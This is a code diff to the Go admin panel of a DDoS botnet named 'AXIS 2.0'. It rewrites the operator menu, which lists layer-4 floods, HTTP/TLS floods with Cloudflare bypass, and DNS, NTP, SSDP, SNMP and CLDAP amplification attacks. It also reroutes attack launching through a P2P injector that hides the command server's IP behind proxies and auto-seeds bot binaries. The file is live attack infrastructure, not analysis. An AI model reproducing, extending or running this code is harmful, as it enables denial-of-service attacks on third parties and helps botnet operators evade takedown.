@@ -12,14 +12,6 @@ import (
 	"time"
 )
 
-/* ============================================================================
- * ADMIN PANEL HANDLER - Encrypted Telnet Interface
- * ============================================================================
- * Provides CLI interface for botnet control
- * Features: Attack launching, user management, network tools
- * Authentication: Database-backed with login logging
- * ============================================================================ */
-
 type Admin struct {
 	conn net.Conn
 }
@@ -87,30 +79,18 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[1;36m                  hyper-volumetric DDoS sender\r\n"))
 
-	// Start window title updater
+	/* Start window title updater */
 	go func() {
-		i := 0
 		for {
-			var BotCount int
-			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
-				BotCount = userInfo.maxBots
-			} else {
-				BotCount = clientList.Count()
-			}
-
 			time.Sleep(time.Second)
-			title := fmt.Sprintf("\033]0; %d Bots | AXIS 2.0 | User: %s\007", BotCount, username)
+			title := fmt.Sprintf("\033]0; P2P Network | AXIS 2.0 | User: %s\007", username)
 			if userInfo.admin == 1 {
-				title = fmt.Sprintf("\033]0; %d Bots | Admins: %d | Users: %d | Attacks: %d | AXIS 2.0 | %s\007",
-					BotCount, database.totalAdmins(), database.totalUsers(), database.fetchAttacks(), username)
+				title = fmt.Sprintf("\033]0; P2P | Admins: %d | Users: %d | AXIS 2.0 | %s\007",
+					database.totalAdmins(), database.totalUsers(), username)
 			}
 			if _, err := this.conn.Write([]byte(title)); err != nil {
 				this.conn.Close()
 				break
-			}
-			i++
-			if i % 60 == 0 {
-				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
 			}
 		}
 	}()
@@ -134,82 +114,52 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╔═╗\x1b[1;36m═╗ ╦\x1b[1;94m╦\x1b[1;34m╔═╗\x1b[1;36m Distributed\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╠═╣\x1b[1;36m╔╩╦╝\x1b[1;94m║\x1b[1;34m╚═╗\x1b[1;36m Denial\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[0m    \x1b[1;34m╩ ╩\x1b[1;36m╩ ╚═\x1b[1;94m╩\x1b[1;34m╚═╝\x1b[1;36m Of Service\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;36m                     hyper-volumetric DDoS sender\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m           hyper-volumetric DDoS sender - p2p network\r\n"))
 			continue
 		}
 
-		// Help command - Dark blue gradient style
-		if cmd == "HELP" || cmd == "help" || cmd == "?" {
-			this.conn.Write([]byte("\x1b[1;36m                           --> | Help | <--                           \r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╔═════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mlayer4    \x1b[1;94m- \x1b[0mLayer 4 Methods                                                  \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mlayer7    \x1b[1;94m- \x1b[0mLayer 7 HTTP Methods                                                \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mspecial   \x1b[1;94m- \x1b[0mSpecial Methods                                                     \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36mports     \x1b[1;94m- \x1b[0mShows Ports                                                         \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;36madmin     \x1b[1;94m- \x1b[0mShows Admin Commands                                               \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╚═════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
-			continue
-		}
-
-		// Layer 4 (UDP + TCP) methods - Dark blue gradient
-		if cmd == "LAYER4" || cmd == "layer4" || cmd == "L4" || cmd == "l4" {
-			this.conn.Write([]byte("\x1b[1;36m                        --> | Layer 4 | <--                         \r\n"))
+		// Help command - shows all methods in one menu
+		if cmd == "HELP" || cmd == "help" || cmd == "?" || cmd == "METHODS" || cmd == "methods" {
+			this.conn.Write([]byte("\x1b[1;36m                          --> | ALL METHODS | <--                       \r\n"))
 			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mVolumetric:                                                                         \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcp\x1b[1;34m, \x1b[1;93mudp\x1b[1;34m, \x1b[1;93micmp\x1b[1;34m                                                                          \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mOVH Bypass:                                                                         \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93movhtcp\x1b[1;34m, \x1b[1;93movhudp\x1b[1;34m                                                                       \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mGRE:                                                                                \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip\x1b[1;34m, \x1b[1;93mgreeth\x1b[1;34m                                                                       \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 UDP:                                                                        \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mudp <ip> <time> [len=1472] [dport=80]\x1b[1;34m                                       \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgame <ip> <time> [dport=27015]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdiscord <ip> <time>\x1b[1;34m                                                           \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mpps <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 4 TCP:                                                                        \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msyn <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mack <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mfin <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mrst <ip> <time> [dport=80]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcpconn <ip> <time> [dport=80]\x1b[1;34m                                              \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mxmas <ip> <time> [dport=80]\x1b[1;34m                                                 \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mnull <ip> <time> [dport=80]\x1b[1;34m                                                 \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mwindow <ip> <time> [dport=80]\x1b[1;34m                                               \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mLAYER 7 HTTP:                                                                       \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtls <url> <time> [domain=x]\x1b[1;34m                                                 \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtlsplus <url> <time> [domain=x]\x1b[1;34m                                             \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mcf <url> <time> [domain=x]\x1b[1;34m                                                  \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 <url> <time> [domain=x]\x1b[1;34m                                             \x1b[1;34m║\r\n"))
 			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAMPLIFICATION:                                                                      \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp\x1b[1;34m, \x1b[1;93mntp-amp\x1b[1;34m, \x1b[1;93mssdp-amp\x1b[1;34m, \x1b[1;93msnmp-amp\x1b[1;34m, \x1b[1;93mcldap-amp\x1b[1;34m                                   \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAXIS COMBINED:                                                                      \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-tcp\x1b[1;34m - TCP+OVH-TCP+ICMP+GRE (40/30/10/10/10%)                        \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-udp\x1b[1;34m - UDP+OVH-UDP+ALL_AMP+VSE+ICMP+GRE (most powerful)              \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mtcp <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93movhtcp <ip> <time> dport=27015\x1b[1;34m                                                    \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp <ip> <time>\x1b[1;34m (no port needed)                                               \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-tcp <ip> <time> tcpport=80 greport=80\x1b[1;34m                                            \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-udp <ip> <time> udpport=53 greport=53\x1b[1;34m                                            \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAdvanced Flags: \x1b[1;93mmss=1460\x1b[1;34m, \x1b[1;93mwscale=7\x1b[1;34m, \x1b[1;93mtimestamp=1\x1b[1;34m, \x1b[1;93mfragment=1\x1b[1;34m, \x1b[1;93madaptive=1\x1b[1;34m                   \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mdns-amp <ip> <time>\x1b[1;34m                                                         \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mntp-amp <ip> <time>\x1b[1;34m                                                         \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mssdp-amp <ip> <time>\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93msnmp-amp <ip> <time>\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mcldap-amp <ip> <time>\x1b[1;34m                                                       \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mSPECIAL:                                                                            \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93micmp <ip> <time>\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <ip> <time>\x1b[1;34m                                                           \x1b[1;34m║\r\n"))
+			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreeth <ip> <time>\x1b[1;34m                                                          \x1b[1;34m║\r\n"))
+			if userInfo.admin == 1 {
+				this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
+				this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mADMIN: \x1b[1;93madduser\x1b[1;34m, \x1b[1;93maddadmin\x1b[1;34m, \x1b[1;93mdeluser\x1b[1;34m, \x1b[1;93mupgradeuser\x1b[1;34m, \x1b[1;93mlistusers\x1b[1;34m, \x1b[1;93mports\x1b[1;34m, \x1b[1;93madmin\x1b[1;34m, \x1b[1;93mcls\x1b[1;34m, \x1b[1;93mlogout\x1b[1;34m          \x1b[1;34m║\r\n"))
+			}
 			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
 
-		// Layer 7 (HTTP) methods - Dark blue gradient
-		if cmd == "LAYER7" || cmd == "layer7" || cmd == "L7" || cmd == "l7" || cmd == "HTTP" || cmd == "http" {
-			this.conn.Write([]byte("\x1b[1;36m                     --> | Layer 7 (HTTP) | <--                      \r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;93mhttp\x1b[1;34m, \x1b[1;93maxis-l7\x1b[1;34m (browser emulation + captcha bypass + CF bypass)                    \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mhttp https://example.com/ 60\x1b[1;34m                                                        \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;34m                                 \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mAdvanced Flags: \x1b[1;93mcookies=\"cf_clearance=xxx\"\x1b[1;34m, \x1b[1;93mtlsfp=chrome\x1b[1;34m, \x1b[1;93mfprot=1\x1b[1;34m                        \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
-			continue
-		}
-
-		// Special methods - Dark blue gradient
-		if cmd == "SPECIAL" || cmd == "special" || cmd == "SPEC" || cmd == "spec" {
-			this.conn.Write([]byte("\x1b[1;36m                       --> | Special | <--                        \r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;93micmp\x1b[1;34m, \x1b[1;93mgreip\x1b[1;34m, \x1b[1;93mgreeth\x1b[1;34m                                                                        \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║ \x1b[1;37mExamples:                                                                           \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93micmp <ip> <time>\x1b[1;34m                                                                    \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreip <ip> <time> dport=80\x1b[1;34m                                                            \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m║   \x1b[1;93mgreeth <ip> <time> dport=80\x1b[1;34m                                                           \x1b[1;34m║\r\n"))
-			this.conn.Write([]byte("\x1b[1;34m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
-			continue
-		}
-
-		// Admin command - Dark blue gradient
+		// Admin command menu - only for admins
 		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
 			this.conn.Write([]byte("\x1b[1;36m                       --> | Admin HUB | <--                        \r\n"))
 			this.conn.Write([]byte("\x1b[1;34m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
@@ -304,7 +254,7 @@ func (this *Admin) Handle() {
 			cmd = cataSplit[1]
 		}
 
-		// Parse and launch attack - Dark blue gradient
+		// Parse and launch attack
 		atk, err := NewAttack(cmd, userInfo.admin)
 		if err != nil {
 			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
@@ -316,8 +266,27 @@ func (this *Admin) Handle() {
 				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
 					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s\x1b[0m\r\n", err.Error())))
 				} else if !database.ContainsWhitelistedTargets(atk) {
-					clientList.QueueBuf(buf, botCount, botCatagory)
-					this.conn.Write([]byte("\x1b[1;36mAttack launched successfully!\x1b[0m\r\n"))
+					/* Send via P2P network using proxy-based injection
+					 * CNC joins the botnet via proxies to shield its IP
+					 * Auto-seeds binaries only when bot count < 200
+					 */
+					p2pSeeds := "127.0.0.1:49152"  /* Update with your seed peers */
+					proxies := []string{
+						/* Add proxy peer IPs here to shield CNC IP */
+						/* "proxy1:49152", "proxy2:49152", */
+					}
+					injector := NewP2PInjector(p2pSeeds, proxies)
+
+					/* Update bot count for auto-seed control */
+					injector.UpdateBotCount(clientList.ClientCount())
+
+					if !injector.ShouldSeed() {
+						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched via P2P (no binary seeding - %d bots active)\x1b[0m\r\n", injector.BotCount())))
+					} else {
+						this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mAttack launched via P2P (seeding binaries - %d bots active)\x1b[0m\r\n", injector.BotCount())))
+					}
+
+					injector.SendAttack(buf)
 				} else {
 					this.conn.Write([]byte("\x1b[1;34mTarget is whitelisted!\x1b[0m\r\n"))
 				}
